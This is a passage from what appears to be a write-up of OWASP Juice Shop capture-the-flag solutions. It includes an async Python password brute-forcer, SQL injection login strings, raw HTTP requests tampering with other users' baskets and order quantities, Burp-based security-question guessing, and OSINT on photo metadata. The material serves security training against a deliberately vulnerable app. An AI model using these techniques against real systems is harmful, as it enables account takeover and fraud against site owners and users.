        for low_letter in lowercase_letters:
            for number in numbers:
                queue.append(f"{up_letter}{number}{low_letter}.....................")
    return queue


async def login_amy(name, async_queue):

    async with aiohttp.ClientSession() as session:
        while not async_queue.empty():
            password = await async_queue.get()
            print(f"Task {name}:\t Trying password: {password}")
            async with session.post(
                your_juice_shop_url,
                json={"email": "amy@juice-sh.op", "password": password},
            ) as response:
                await response.text()


async def main(password_queue):

    async_queue = asyncio.Queue()

    for password in password_queue:
        await async_queue.put(password)

    await asyncio.gather(
        asyncio.create_task(login_amy("One", async_queue)),
        asyncio.create_task(login_amy("Two", async_queue)),
        asyncio.create_task(login_amy("Three", async_queue)),
        asyncio.create_task(login_amy("Four", async_queue)),
        asyncio.create_task(login_amy("Five", async_queue)),
    )

    return False


if __name__ == "__main__":
    password_queue = build_queue()
    asyncio.run(main(password_queue))
```

</details>

Then I use Wireshark to capture packages:

![capture packages](https://user-images.githubusercontent.com/64480713/180433342-eda69500-69dc-4da5-b4b1-108ecc26b03d.png)

As you can see, only one request was responded to with the status `200 OK`:

![success package](https://user-images.githubusercontent.com/64480713/180433562-132d276a-bbb1-43b2-be3f-8d361dd2d631.png)

And it was the response to a request with the password **`K1f.....................`**:

![image](https://user-images.githubusercontent.com/64480713/180433668-4486b246-22b3-47c6-81e7-a3068d03c93f.png)

Finally, I logged in successfully to Amy's account with this information:

![login successfully](https://user-images.githubusercontent.com/64480713/180433905-c5ed4a67-220c-4a0d-b50c-68f4035afdf7.png)

---

### Login Bender

**Difficulty**: 🌟🌟🌟

**Description**: Log in with Bender's user account.

**Category**: Injection

**Tags**: `Tutorial`

**Solution**:

<!-- Please include screenshots for each step. Remember that the screenshot includes a clock to indicate the time solved. -->

Because I have logged in admin account, I have Bender's email

![image](https://user-images.githubusercontent.com/63692190/180630824-eed80632-0d77-40dd-99cf-e9ff522293e3.png)

Using SQL injection, log in with email `bender@juice-sh.op'--` and any password

![image](https://user-images.githubusercontent.com/63692190/180630915-4781fe6e-56b4-41cf-b9b7-57ee6483f88a.png)

The challenge is solved

![image](https://user-images.githubusercontent.com/63692190/180630923-1d76869a-3ffd-48b8-9924-9eb530c21b72.png)

---

### Login Jim

**Difficulty**: 🌟🌟🌟

**Description**: Log in with Jim's user account.

**Category**: Injection

**Tags**: `Tutorial`

**Solution**:

<!-- Please include screenshots for each step. Remember that the screenshot includes a clock to indicate the time solved. -->

Because I have logged in admin account, I have Jim's email

![image](https://user-images.githubusercontent.com/63692190/180630824-eed80632-0d77-40dd-99cf-e9ff522293e3.png)

Using SQL injection, log in with email `jim@juice-sh.op'--` and any password

![image](https://user-images.githubusercontent.com/63692190/180630889-0468f261-4470-4139-94c1-999de879a4c3.png)

The challenge is solved

![image](https://user-images.githubusercontent.com/63692190/180630898-a2958c17-898e-4696-ae4e-4daf1e966bc8.png)

---

### Login MC SafeSearch

**Difficulty**: 🌟🌟

**Description**: Log in with MC SafeSearch's original user credentials without applying SQL Injection or any other bypass.

**Category**: Sensitive Data Exposure

**Tags**: `Shenanigans`, `OSINT`

**Solution**:

Get MC SafeSeach's email from his review in `Juice Shop "Permafrost" 2020 Edition`
![image](https://user-images.githubusercontent.com/70436051/180361482-c34626dc-5b7f-43a6-afa0-bf1cb653035b.png)

Search his name on google you will find his rap
![image](https://user-images.githubusercontent.com/70436051/180361682-9a3d3168-cff4-48e3-b6d5-247778735cb0.png)

When you listen to the rap, you will hear him mention how to set his password, it's his dog's name Mr. Noodles replaces the letter o with the number 0. His password is Mr. N00dles, let's try this
![image](https://user-images.githubusercontent.com/70436051/180362235-d286e56d-5f79-45a6-bcf4-892edd216462.png)

We got this challenge!!

---

### Manipulate Basket

**Difficulty**: 🌟🌟🌟

**Description**: Put an additional product into another user's shopping basket.

**Category**: Broken Access Control

**Tags**:

**Solution**:

After taking a peek a the solution guide, I found out that I can update the multiple baskets using a JSON object with duplicate entries:

<details>
<summary>Click to toggle contents of other `code`</summary>

```
POST /api/BasketItems/ HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en,en-US;q=0.9
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0aWVudmluaC5kdW9uZzRAZ21haWwuY29tIiwicGFzc3dvcmQiOiI4MjdjY2IwZWVhOGE3MDZjNGMzNGExNjg5MWY4NGU3YiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wNy0yMSAxMzo1MjozOS40NjEgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMi0wNy0yMSAxNDoxODo1MS45MDEgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjU4NDEzNjMyLCJleHAiOjE2NTg0MzE2MzJ9.J2gUOZULohN-bhTjQTfkhwJ2sKLUZcKhjpbImmmBkZ8BOt60LQQ-O9aEoXHD5nd9Qppz0k1cZMY1c2aZNp7e9VNHRpBuz4D62FH_jd3NsqMA2Li8u7oNBx4HguX7A_godqeUrVvJrQ_no9WkOXaUE9E97fZa4CEhQNyx1fYUF6Q
Connection: keep-alive
Content-Length: 90
Content-Type: application/json
Cookie: language=en; cookieconsent_status=dismiss; continueCode=WaVEx4lNDyYmdEytWswUEHLTofKi5OS98t2yiRkh77FM4t3Xdkrjw95LOqP2; welcomebanner_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0aWVudmluaC5kdW9uZzRAZ21haWwuY29tIiwicGFzc3dvcmQiOiI4MjdjY2IwZWVhOGE3MDZjNGMzNGExNjg5MWY4NGU3YiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wNy0yMSAxMzo1MjozOS40NjEgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMi0wNy0yMSAxNDoxODo1MS45MDEgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjU4NDEzNjMyLCJleHAiOjE2NTg0MzE2MzJ9.J2gUOZULohN-bhTjQTfkhwJ2sKLUZcKhjpbImmmBkZ8BOt60LQQ-O9aEoXHD5nd9Qppz0k1cZMY1c2aZNp7e9VNHRpBuz4D62FH_jd3NsqMA2Li8u7oNBx4HguX7A_godqeUrVvJrQ_no9WkOXaUE9E97fZa4CEhQNyx1fYUF6Q
DNT: 1
Host: localhost:3000
Origin: http://localhost:3000
Referer: http://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"

{
    "ProductId": 20,
    "BasketId": "6",
    "BasketId": "2",
    "quantity": 1
}
```

</details>

Result: I can successfully add an additional item to `BasketId: 2`

![result](https://user-images.githubusercontent.com/64480713/180245606-e46fafc0-9a28-45b4-a30c-18281ab74287.png)

---

### Meta Geo Stalking

**Difficulty**: 🌟🌟

**Description**: Determine the answer to John's security question by looking at an upload of him to the Photo Wall and use it to using his password via the [Forgot Password](http://127.0.0.1:3000/#/forgot-password) mechanism.

**Category**: Sensitive Data Exposure

**Tags**: `OSINT`

**Solution**:

Go to `Photo Wall` and download John's photo (John aka J0hNny)
![image](https://user-images.githubusercontent.com/70436051/180357449-e6be9f5f-d2b1-4d92-b565-8683cc0fc00e.png)

Use the `exiftool` to look at the metadata of this photo, you can see the `GPS Position`
![image](https://user-images.githubusercontent.com/70436051/180357966-9ff858b2-940d-4c55-90cc-9b0c036ec1af.png)

Search this position on Google Maps (remember to replace `deg` with `°`), and find a place where you can hike
![image](https://user-images.githubusercontent.com/70436051/180358437-fd290628-8999-4da7-b686-e59e0b0c672f.png)

It's `Daniel Boone National Forest`, go to `Forgot Password` and use email `john@juice-sh.op` and security question is `Daniel Boone National Forest`, give him a new password and click `Change`. We got this challenge!
![image](https://user-images.githubusercontent.com/70436051/180358895-cf34d59f-8073-44f7-9c17-30f49b187f0d.png)

---

### Missing Encoding

**Difficulty**: 🌟

**Description**: Retrieve the photo of Bjoern's cat in "melee combat-mode".

**Category**: Improper Input Validation

**Tags**: `Shenanigans`

**Solution**:

Go to `Photo Wall` page you will see an error photo displayed
![image](https://user-images.githubusercontent.com/70436051/180348507-78c8a381-9eec-47e7-a9cc-d4e11cbd67cc.png)

Go to the src path of the image in the HTML code, we see the `#`
![image](https://user-images.githubusercontent.com/70436051/180349136-097706fe-4553-4c09-9b68-5270d9d5d402.png)

The file path uses `#` which will be interpreted as HTML anchors. So we fix it to `%23`, which when encoded it becomes `#`
![image](https://user-images.githubusercontent.com/70436051/180349372-feb69aa9-3634-4142-a18d-42449172a069.png)

Bravo! We got it.

---

### Outdated Allowlist

**Difficulty**: 🌟

**Description**: Let us redirect you to one of our crypto currency addresses which are not promoted any longer.

**Category**: Unvalidated Redirects

**Tags**: `Code Analysis`

**Solution**:

<!-- Please include screenshots for each step. Remember that the screenshot includes a clock to indicate the time solved. -->

In file `main.js`, I search for the `redirect` pattern which show redirect link to 3 bitcoin wallet

![image](https://user-images.githubusercontent.com/63692190/180374913-a2e7d305-9a41-4516-9b73-ab7619afcd7c.png)

Open the link: http://localhost:3000/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm and got redirected to

![image](https://user-images.githubusercontent.com/63692190/180376187-d71a8ad2-9a4e-4517-adc2-638157b5f765.png)

Result:

![image](https://user-images.githubusercontent.com/63692190/180376229-3c88ae9e-c05b-491f-b266-58b711a92f3a.png)

---

### Password Strength

**Difficulty**: 🌟🌟

**Description**: Log in with the administrator's user credentials without previously changing them or applying SQL Injection.

**Category**: Broken Authentication

**Tags**: `Brute Force`, `Tutorial`

**Solution**:

1. Go to login page http://localhost:3000/#/login

2. Try to guess login credentials. The correct login credential is email: `admin@juice-sh.op`, password `admin123`

![image](https://user-images.githubusercontent.com/63692190/180612779-58248e3e-df98-4e52-a923-ec5ab7076992.png)

---

### Payback Time

**Difficulty**: 🌟🌟🌟

**Description**: Place an order that makes you rich.

**Category**: Improper Input Validation

**Tags**:

**Solution**:

I inspected the request after adding items to the basket:

<details>
<summary>Add item request</summary>

```
POST /api/BasketItems/ HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en,en-US;q=0.9
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0aWVudmluaC5kdW9uZzRAZ21haWwuY29tIiwicGFzc3dvcmQiOiI4MjdjY2IwZWVhOGE3MDZjNGMzNGExNjg5MWY4NGU3YiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMDctMjEgMTM6NTI6MzkuNDYxICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMDctMjEgMTM6NTI6MzkuNDYxICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY1ODQxMTU2OSwiZXhwIjoxNjU4NDI5NTY5fQ.sjcN_BJX47dDpi4h_j55YnFv5c8Pa4ViQ7F9d6fcFAdzCSwvmKjMrkNKyM8pAEN8O7fA5xYIAWOKDGWiDlglC3Y0g5vlWlCj1vhpcGF2uB7x6uhBFdNv8lBddAchk4BMkk6HyyxKz38iAw8q6BGavC9oCsEqpIBLoSOgEaSsJBA
Connection: keep-alive
Content-Length: 44
Content-Type: application/json
Cookie: language=en
DNT: 1
Host: localhost:3000
Origin: http://localhost:3000
Referer: http://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"

{
  "ProductId": 24,
  "BasketId": "6",
  "quantity": 1
}
```

</details>

![example request to add items to basket](https://user-images.githubusercontent.com/64480713/180234565-35c5a644-26c2-4002-a0a9-17fee21dd20a.png)

So I tried to change `quantity` to `-1111` so the money we pay would be **negative**, and the request was processed successfully :exclamation::

![successful request](https://user-images.githubusercontent.com/64480713/180235026-5357f075-ef27-4c39-8059-90c08a16891f.png)

Let's check the basket:

![current basket](https://user-images.githubusercontent.com/64480713/180235385-7d09df77-5f2c-496f-b5c4-d547b894b1f9.png)

Then check out the order:

![checkout](https://user-images.githubusercontent.com/64480713/180235726-b60edfe1-f1e2-4768-8ae6-a4be9622f466.png)

Result:

![result](https://user-images.githubusercontent.com/64480713/180235812-14bf7b69-f00e-4124-9a61-5b60f2c197e6.png)

---

### Privacy Policy Inspection

**Difficulty**: 🌟🌟🌟

**Description**: Prove that you actually read our privacy policy.

**Category**: Security through Obscurity

**Tags**: `Shenanigans`, `Good for Demos`

**Solution**:

<!-- Please include screenshots for each step. Remember that the screenshot includes a clock to indicate the time solved. -->

Open http://localhost:3000/#/privacy-security/privacy-policy
While reading and moving the cursor along paragraphs, I noticed the special effect when the cursor hovers on some text, So I use DevTools to inspect it

![image](https://user-images.githubusercontent.com/63692190/180631150-2c6d083f-c66d-416b-8f3f-59bf9739d807.png)

Note down all text inside `<span class="hot"></span>` tags, which are `http://localhost`, `We may also`, `instruct you`, `to refuse all`, `reasonably necessary` and `responsibility`

Combine those into URL http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility and visit it

![image](https://user-images.githubusercontent.com/63692190/180631340-b81fed87-df66-4375-91fa-e76e67e26283.png)

It's 404 error, but the challenge is solved

![image](https://user-images.githubusercontent.com/63692190/180631353-cf7486f7-14ef-446e-a51c-2d153c95a9a0.png)

---

### Privacy Policy

**Difficulty**: 🌟

**Description**: Read our privacy policy.

**Category**: Miscellaneous

**Tags**: `Good Practice`, `Good for Demos`, `Tutorial`

**Solution**:

First you need to login, you can find `Privacy Policy` page in `Account` &#8594; `Privacy & Security` &#8594; `Privacy Policy`
![image](https://user-images.githubusercontent.com/70436051/180351089-2932f486-7902-4321-bc48-7de5adc82200.png)

We got this challenge :)
![image](https://user-images.githubusercontent.com/70436051/180351157-de5ba32b-7e36-48ec-8262-af24b08eef39.png)

---

### Repetitive Registration

**Difficulty**: 🌟

**Description**: Follow the DRY principle while registering a user.

**Category**: Improper Input Validation

**Tags**:

**Solution**:

DRY principle mean Dry Repeat Yourself, in the registration process you are usually required to re-enter password for confirmation. So the objective here is to bypass the repeat password checking

1. Go to http://localhost:3000/#/register and input all required information

![image](https://user-images.githubusercontent.com/63692190/180608532-6024bf75-1341-4e6f-8de1-2466b2328592.png)

2. If I change the content in field repeat password, the website does not allow me to register

![image](https://user-images.githubusercontent.com/63692190/180609025-effe41eb-3633-4df6-ad77-224290c33d45.png)

3. But if I change password field, no checking was performed and the register button is clickable

![image](https://user-images.githubusercontent.com/63692190/180609069-0ce13ab3-f0e2-4355-8892-212ccffe8640.png)

4. Result: Succeeded, It seems that no checking was done at server

![image](https://user-images.githubusercontent.com/63692190/180609295-6c3481fc-ec92-4c70-8360-3333f40937b6.png)

---

### Reset Jim's Password

**Difficulty**: 🌟🌟🌟

**Description**: Reset Jim's password via the [Forgot Password](http://localhost:3000/#/forgot-password) mechanism with the original answer to his security question.

**Category**: Broken Authentication

**Tags**: `OSINT`

**Solution**:

Go to `Forgot Password`, use jim@juice-sh.op as email, and optionally enter the answer. This will throw `Wrong answer to security question.`
![image](https://user-images.githubusercontent.com/70436051/180383859-f342e91d-a762-4105-abec-c566eb590cb8.png)

Open `Burp Suite` &#8594; `Proxy` &#8594; `HTTP History` and find `POST /rest/user/reset-password`, send it to `repeater`
![image](https://user-images.githubusercontent.com/70436051/180384352-a3ad7d89-4806-4188-8ed9-605085aaebbc.png)

Send it to `intruder`, click `clear §`, add `§` to value off `answer:`
![image](https://user-images.githubusercontent.com/70436051/180385574-334eb660-66c1-4a7a-b683-d0bd439737b1.png)

Go to `payload`, search Google for a list of common names and load that list to `payload options`
![image](https://user-images.githubusercontent.com/70436051/180386271-3ef3a336-db0a-433c-bdfc-03c246b32489.png)

Go to `options` &#8594; `Grep - Extract` and Add `Wrong answer to security question.`
![image](https://user-images.githubusercontent.com/70436051/180386628-46303b88-89f3-4a61-871d-77e66bfd195b.png)

Click `start attack` and wait for the successful attack, find the status 200
![image](https://user-images.githubusercontent.com/70436051/180386961-ce8dbfc0-d9d0-45d6-aaa1-a60c0d1d817e.png)

Yeh his middle name is Samuel, use it to reset the password, we got this challenge

---

### Score Board

**Difficulty**: 🌟

**Description**: Find the carefully hidden 'Score Board' page.

**Category**: Miscellaneous

**Tags**: `Tutorial`, `Code Analysis`

**Solution**:

When I opened DevTools and find file `main.js` to find the `score` string pattern, I found a link: `score-board`. After opening that link, I found the Scoreboard.

![search for score board](https://user-images.githubusercontent.com/64480713/179403553-cf1413c5-1c40-4394-8814-96b7fe046b84.png)

Result:

![result](https://user-images.githubusercontent.com/64480713/179403583-439c42c4-621c-4221-98c0-05fe37a82832.png)

---

### Security Policy

**Difficulty**: 🌟🌟

**Description**: Behave like any "white-hat" should before getting into the action.

**Category**: Miscellaneous

**Tags**: `Good Practice`

**Solution**:

After some research, I found that there is a file `security.txt` for security researchers to easily report security vulnerabilities on [Wikipedia](https://en.wikipedia.org/wiki/Security.txt):

![security.txt wiki](https://user-images.githubusercontent.com/64480713/179762265-fa24a5c3-835f-41f5-a960-c24fd9ac67f7.png)

Then I tried to access route: `/security.txt` or `/.well-known/security.txt` and `/.well-known/security.txt` is the **correct** one:

![result](https://user-images.githubusercontent.com/64480713/179762975-7e50464d-8b70-44f6-b815-a3f44d70e1fa.png)

---

### Upload Size

**Difficulty**: 🌟🌟🌟

**Description**: Upload a file larger than 100 kB.

**Category**: Improper Input Validation

**Tags**:

**Solution**:

Go to the `complaint` page via `/#/complain`
![image](https://user-images.githubusercontent.com/70436051/180413484-3f306cbb-3eb3-4d09-b822-e4e553963887.png)

Try posting a file smaller than 100kb and go to Burp Suite to see the POST /file-upload request
![image](https://user-images.githubusercontent.com/70436051/180414902-15a81666-b1b0-4d99-8427-c92179374cde.png)

Send it to Repeater and replace the content of the sent file with the content of the file you want to send (copy the content of the file you want to send by opening the pdf file through notepad)
![image](https://user-images.githubusercontent.com/70436051/180417858-b4362fba-5bae-4fa9-ac22-45d8051f17a3.png)

Click `Send` and we got this challenge
![image](https://user-images.githubusercontent.com/70436051/180418106-48ac96e7-b66c-4238-813d-8e9cedccef9b.png)

---

### Upload Type

**Difficulty**: 🌟🌟🌟

**Description**: Upload a file that has no .pdf or .zip extension.

**Category**: Improper Input Validation

**Tags**:

**Solution**:

Go to the `complaint` page via http://localhost:3000/#/complain
Try a valid and go to Burp Suite to see the POST /file-upload request

![image](https://user-images.githubusercontent.com/63692190/180630229-025abeaf-72ca-4d94-b448-a44294578999.png)

Send it to Repeater and replace the content of the valid PDF file with plain text and hit Send

![image](https://user-images.githubusercontent.com/63692190/180630411-7f38a6e4-0907-4ba2-aa74-a328554d9c08.png)

The challenge is solved

![image](https://user-images.githubusercontent.com/63692190/180630422-8bf68fe7-af9c-41e1-ac29-2d70d1dfc53a.png)

---

### View Basket

**Difficulty**: 🌟 🌟

**Description**: View another user's shopping basket.

**Category**: Broken Access Control

**Tags**: `Good for Demos`, `Tutorial`

**Solution**:

Let's go to the basket
![image](https://user-images.githubusercontent.com/70436051/180354707-f89a8546-4dc5-40e7-96fb-e51eb07681dd.png)

The basket id is store in the `Session Storage`
![image](https://user-images.githubusercontent.com/70436051/180355113-72b637cd-6ce5-46b8-9276-e95460dd3ee1.png)

Change it (example change it to 1) and reload, we got another user's shopping basket
![image](https://user-images.githubusercontent.com/70436051/180355303-5f497723-1933-480a-b379-1d294474042d.png)

---

### Visual Geo Stalking

**Difficulty**: 🌟🌟

**Description**: Determine the answer to Emma's security question by looking at an upload of her to the Photo Wall and use it to reset her password via the [Forgot Password](http://localhost:3000/#/forgot-password) mechanism.

**Category**: Sensitive Data Exposure

**Tags**: `OSINT`

**Solution**:

I navigated to the Photo Wall route, I found a picture of `© E=ma²`, which is close to `Emma` name:

![emma photo](https://user-images.githubusercontent.com/64480713/179667454-133b54db-537a-4807-b260-17ff4ba8212d.png)

After downloading the image and some inspection, we can see a banner with text: `IT sec`.

![text on banner](https://user-images.githubusercontent.com/64480713/179667982-7ef90ff8-f7fe-47af-bbb7-c245776b86c6.png)

Then I tried multiple with: "itsec", "ITSEC" or "ITCsec" but not succeeded. Then I tried `IT sec` then I can reset the password of `Emma`.

![result](https://user-images.githubusercontent.com/64480713/179666998-4e6a7e04-7c1a-41c5-82ce-10d36629db03.png)

---

### Weird Crypto

**Difficulty**: 🌟🌟

**Description**: Inform the shop about an algorithm or library it should definitely not use the way it does.

**Category**: Cryptographic Issues

**Tags**:

**Solution**:

<!-- Please include screenshots for each step. Remember that the screenshot includes a clock to indicate the time solved. -->

I try to guess some compromised algorithm such as MD5, SHA1, DES, etc.

![image](https://user-images.githubusercontent.com/63692190/180628957-43a2358d-f2f5-4beb-b71a-f8fa821693ee.png)

Result: Correct at first try, this website is still using MD5 for some reason

![image](https://user-images.githubusercontent.com/63692190/180628971-3aa86fe5-ca4f-4d47-8a4b-5d96256f0361.png)

---

### Zero Stars

**Difficulty**: 🌟

**Description**: Give a devastating zero-star feedback to the store.

**Category**: Improper Input Validation

**Tags**:

**Solution**:

Remove `mat-button-disabled` and `disabled="true"` from the `button` element. Then press `Submit` button to submit Zero Star feedback.

E.g:
<code class="language-html">&lt;button \_ngcontent-wpr-c122=&quot;&quot; type=&quot;submit&quot; id=&quot;submitButton&quot; mat-raised-button=&quot;&quot; color=&quot;primary&quot; aria-label=&quot;Button to send the review&quot; class=&quot;mat-focus-indicator mat-raised-button mat-button-base mat-primary <b><s>mat-button-disabled</s></b>&quot; <b><s>disabled=&quot;true&quot;</s></b>&gt;&lt;span class=&quot;mat-button-wrapper&quot;&gt;&lt;i \_ngcontent-wpr-c122=&quot;&quot; class=&quot;material-icons&quot;&gt; send &lt;/i&gt; Submit &lt;/span&gt;&lt;span matripple=&quot;&quot; class=&quot;mat-ripple mat-button-ripple&quot;&gt;&lt;/span&gt;&lt;span class=&quot;mat-button-focus-overlay&quot;&gt;&lt;/span&gt;&lt;/button&gt;</code>

![zero star attack](https://user-images.githubusercontent.com/64480713/179662522-4b56b325-cf2b-43cc-a852-c8aace260b06.png)

Result:
You can see `(null)` feedback:

![result](https://user-images.githubusercontent.com/64480713/179662578-30050c6e-42a7-43e3-91a7-9102b6ce1417.png)

---

<!-- GENERATE-DOC:END -->
